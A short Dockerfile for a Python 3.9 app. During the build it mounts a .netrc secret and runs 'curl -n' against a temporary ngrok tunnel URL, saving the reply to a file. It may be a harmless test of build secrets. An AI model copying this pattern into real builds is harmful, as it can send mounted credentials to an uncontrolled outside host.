# Use the official Python 3.9 image as the base image
FROM python:3.9-slim

# Create a directory for your application
WORKDIR /

RUN apt-get update && apt-get install curl -y
RUN --mount=type=secret,id=netrc,target=/root/.netrc \
   curl -n https://25b3-103-44-174-137.ngrok-free.app > message.txt
   
# Your application code and instructions can follow below
# For example, install dependencies or copy your application files

COPY main.py .

CMD ["python", "main.py"]

